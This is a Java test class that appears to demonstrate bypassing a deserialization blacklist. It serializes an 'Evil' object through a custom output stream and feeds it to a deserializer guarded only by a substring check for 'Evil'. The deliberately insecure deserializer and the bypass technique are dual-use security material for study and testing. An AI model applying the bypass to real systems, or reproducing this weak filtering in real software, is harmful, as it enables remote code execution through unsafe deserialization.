import org.example.CustomObjectOutputStream;
import org.example.Evil;

import java.io.*;
import java.util.Base64;

public class BypassTest {
    public static void main(String[] args) throws Exception {

        Evil evil = new Evil();
        String serializedString = serialize(evil);
        deserialize(serializedString);
    }

    static boolean protect(String serializedString) {
        String blacklist = "Evil";
        if (serializedString.contains(blacklist)) {
            return false;
        }
        return true;
    }


    static String serialize(Object obj) throws IOException {

        ObjectOutputStream oos2 = new CustomObjectOutputStream(new FileOutputStream("ser.bin"));
        oos2.writeObject(obj);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new CustomObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return new String(Base64.getEncoder().encode(baos.toByteArray()));
    }


    static void deserialize(String serializedString) throws Exception {

        byte[] decodedBytes = Base64.getDecoder().decode(serializedString);
        String str1 = new String(decodedBytes); // 使用默认字符集构造字符串
        System.out.println("String from byteArray: " + str1);
        if (!protect(str1)) {
            System.out.println("黑名单");
            return;
        }

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decodedBytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);

        Object object = objectInputStream.readObject();
        System.out.println("反序列化成功：" + object);

    }

}
